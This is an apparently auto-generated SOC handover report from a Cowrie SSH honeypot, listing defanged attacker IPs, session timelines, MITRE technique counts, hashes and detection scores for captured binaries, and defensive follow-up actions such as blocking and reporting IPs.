| `2026-04-29 17:02:45` | `cowrie.client.version` |
| `2026-04-29 17:02:45` | `cowrie.client.kex` |
| `2026-04-29 17:02:46` | `cowrie.login.success` |
| `2026-04-29 17:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9e0cb29a68

| Field | Detail |
|---|---|
| **Source IP** | `163.177.76[.]85` |
| **First Seen** | 2026-04-29 17:27 |
| **Last Seen** | 2026-04-29 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-29 17:27:05` | `cowrie.session.connect` |
| `2026-04-29 17:27:05` | `cowrie.client.version` |
| `2026-04-29 17:27:05` | `cowrie.client.kex` |
| `2026-04-29 17:27:06` | `cowrie.login.success` |
| `2026-04-29 17:27:06` | `cowrie.session.params` |
| `2026-04-29 17:27:06` | `cowrie.command.input` |
| `2026-04-29 17:27:06` | `cowrie.log.closed` |
| `2026-04-29 17:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.177.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `163.177.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `154.209.4[.]208` | **30** | 2026-04-29 16:20 | 2026-04-29 16:47 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.5[.]249` | **30** | 2026-04-29 16:15 | 2026-04-29 17:10 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.221.28[.]214` | **25** | 2026-04-29 14:13 | 2026-04-29 14:40 | 2m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `91.230.168[.]236` | **2** | 2026-04-29 16:26 | 2026-04-29 16:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-04-29 17:05 | 2026-04-29 17:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `103.49.188[.]186` | 1 | 2026-04-29 17:09 | 2026-04-29 17:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.177.76[.]85` | 1 | 2026-04-29 17:27 | 2026-04-29 17:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-29 17:23 | 2026-04-29 17:24 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.239.239[.]67` | 1 | 2026-04-29 14:36 | 2026-04-29 14:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.0.89[.]217` | 1 | 2026-04-29 16:49 | 2026-04-29 16:49 | 31s | 0 | `T1592` | 🟢 LOW |
| `43.226.39[.]177` | 1 | 2026-04-29 14:15 | 2026-04-29 14:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]188` | 1 | 2026-04-29 15:58 | 2026-04-29 15:58 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]12` | 1 | 2026-04-29 16:29 | 2026-04-29 16:29 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (24 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.230.168[.]236` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `185.239.239[.]67` | DE | ZAP-Hosting GmbH | **100** ⚠️ | 7 |
| `66.132.186[.]188` | US | Censys, Inc. | **100** ⚠️ | 38 |
| `163.177.76[.]85` | CN | China Unicom Guangdong province network | **100** ⚠️ | 17 |
| `91.230.168[.]12` | US | FR ONYPHE | **100** ⚠️ | 50 |
| `154.209.4[.]208` | HK | Yisu Cloud Ltd | **100** ⚠️ | 37 |
| `154.221.28[.]214` | HK | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `103.203.57[.]19` | US | Beijing Tiantexin Tech. Co., Ltd. | **100** ⚠️ | 50 |
| `103.49.188[.]186` | ID | PT Indonesia Comnets Plus | **100** ⚠️ | 14 |
| `43.226.39[.]177` | CN | Shenzhen Qianhai bird cloud computing Co. Ltd. | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 136 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 85 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 44 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 22 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 22 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 169 cases |
| Tool 34  | Credential Extractor        | ✅ 129 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (17.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 24 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 44 priority case(s) shown individually · 13 recon entry/entries in table (4 group(s) consolidating 87 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-29T17:43:03Z_
